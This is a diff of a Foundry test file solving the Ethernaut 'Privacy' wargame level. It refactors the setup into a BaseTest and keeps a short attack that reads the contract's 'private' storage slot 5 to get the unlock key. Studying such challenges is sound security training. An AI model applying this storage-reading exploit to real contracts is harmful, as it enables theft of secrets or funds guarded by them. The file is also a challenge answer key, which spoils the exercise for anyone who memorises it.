@@ -1,45 +1,19 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.13;
 
-import {Test} from "forge-std/Test.sol";
+import {BaseTest} from "./BaseTest.sol";
 import {PrivacyFactory} from "../src/levels/12-PrivacyFactory.sol";
 import {Privacy} from "../src/levels/12-Privacy.sol";
-import {Ethernaut} from "../src/core/Ethernaut.sol";
 
-contract PrivacySolution is Test {
-    Ethernaut internal ethernaut;
-    address internal attacker = address(1337);
-    PrivacyFactory internal factory;
+contract PrivacySolution is BaseTest {
 
-    function solution(Privacy target) internal {
+    function solution(address payable target_) internal override{
+        Privacy target = Privacy(target_);
         bytes32 keyWord = vm.load(address(target), bytes32(uint256(5)));
         target.unlock(bytes16(keyWord));
     }
 
-    function testSolution() public {
-        /////////////////
-        // LEVEL SETUP //
-        /////////////////
-        ethernaut = new Ethernaut();
-        vm.deal(attacker, 1 ether/10);
-
-        factory = new PrivacyFactory();
-        ethernaut.registerLevel(factory);
-        vm.startPrank(attacker);
-        address levelAddress = ethernaut.createLevelInstance(factory);
-        Privacy privacyContract = Privacy(payable(levelAddress));
-
-        //////////////////
-        // LEVEL ATTACK //
-        //////////////////
-
-        solution(privacyContract);
-
-        //////////////////////
-        // LEVEL SUBMISSION //
-        //////////////////////
-        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
-        vm.stopPrank();
-        assert(isLevelSuccessfullyPassed);
+    function construction() internal override returns(address payable ) {
+        return payable(address(new PrivacyFactory()));
     }
 }
